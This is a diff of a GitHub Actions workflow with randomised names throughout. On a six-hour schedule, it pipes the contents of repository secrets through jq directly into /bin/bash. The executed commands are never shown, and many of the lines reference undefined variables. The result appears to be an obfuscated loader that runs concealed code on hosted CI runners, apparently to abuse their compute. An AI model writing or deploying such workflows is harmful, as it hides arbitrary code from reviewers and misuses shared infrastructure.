@@ -2,8 +2,7 @@ name: liuyidao4657
 on:
   workflow_dispatch:
   schedule:
-    - cron: '4 3/6 * * *'
-
+    - cron: '38 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,29 +11,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: liuyidao4657
         env:
-          ehwrp3202: ${{ secrets.ehwrp3202 }}
+          crng190: ${{ secrets.crng190 }}
         run: |
-          echo $ehwrp3202 | jq -r .lpvmn4367 | /bin/bash
-          echo $niq3 | jq -r .npqk1322 | /bin/bash
-          echo $i1 | jq -r .aukg78 | /bin/bash
-          echo $kmhq8 | jq -r .bg61080 | /bin/bash
-          echo $ph31718 | jq -r .q778 | /bin/bash
-          echo $ar23 | jq -r .ajfh98 | /bin/bash
-          echo $ddicd89 | jq -r .vnxf2 | /bin/bash
-          echo $ehq09 | jq -r .w7 | /bin/bash
-          echo $yxsr3489 | jq -r .zdaju93 | /bin/bash
-          echo $jsjlf450 | jq -r .dr00 | /bin/bash
-          echo $yhbsg45911 | jq -r .ybqu97 | /bin/bash
-          echo $pyutd68 | jq -r .dk4302 | /bin/bash
-          echo $a408 | jq -r .hq1 | /bin/bash
-          echo $krgu0 | jq -r .ixfc7309 | /bin/bash
-          echo $u010 | jq -r .wl1457 | /bin/bash
-          echo $bqyw33222 | jq -r .necuu2 | /bin/bash
-          echo $ytt09 | jq -r .yndzw5023 | /bin/bash
-          echo $dlq3 | jq -r .j76321 | /bin/bash
-          echo $nflm69708 | jq -r .tkke269 | /bin/bash
-          echo $z64 | jq -r .roed60288 | /bin/bash
-          echo $qwbgk02113 | jq -r .hweo4298 | /bin/bash
-          echo $efei462 | jq -r .vil9 | /bin/bash
-          echo $tbea7 | jq -r .ip54257 | /bin/bash
+          echo $crng190 | jq -r .pnvn706 | /bin/bash
+          echo $d0811 | jq -r .n33 | /bin/bash
+          echo $d04854 | jq -r .p2628 | /bin/bash
+          echo $qjhuf739 | jq -r .qygzv23911 | /bin/bash
+          echo $goox870 | jq -r .tac8 | /bin/bash
+          echo $olz75 | jq -r .tqx8 | /bin/bash
+          echo $ubmgy702 | jq -r .oals8 | /bin/bash
+          echo $mjp8310 | jq -r .of409 | /bin/bash
+          echo $ez4 | jq -r .mjnfc4 | /bin/bash
+          echo $lovb07 | jq -r .mynxv45 | /bin/bash
+          echo $wa18 | jq -r .bz5 | /bin/bash
+          echo $grcs99565 | jq -r .qai9 | /bin/bash
+          echo $npvza788 | jq -r .phc1 | /bin/bash
 
